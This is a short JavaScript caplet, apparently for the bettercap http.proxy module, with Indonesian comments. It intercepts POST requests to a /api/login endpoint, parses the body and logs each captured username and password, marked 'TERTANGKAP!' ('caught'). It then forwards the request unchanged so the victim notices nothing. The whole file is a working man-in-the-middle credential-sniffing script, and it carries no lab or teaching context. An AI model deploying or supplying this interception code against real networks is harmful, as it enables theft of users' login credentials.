function onHttpRequest(req, res) {
    if (req.Method == "POST" && req.Path == "/api/login") {
        var body = req.ReadBody();
        try {
            var json = JSON.parse(body);
            log_error("[http.proxy.auth] POST http://" + req.Hostname + ":" + req.Port + req.Path);
            log_error("           → username=" + json.username + " password=" + json.password + "   ← TERTANGKAP!");
        } catch(e) {
            log_error("[http.proxy.auth] POST http://" + req.Hostname + ":" + req.Port + req.Path);
            log_error("           → " + body + "   ← TERTANGKAP!");
        }
        // Mengembalikan body ke request agar tidak kosong saat diteruskan ke backend
        req.Body = body;
    }
}
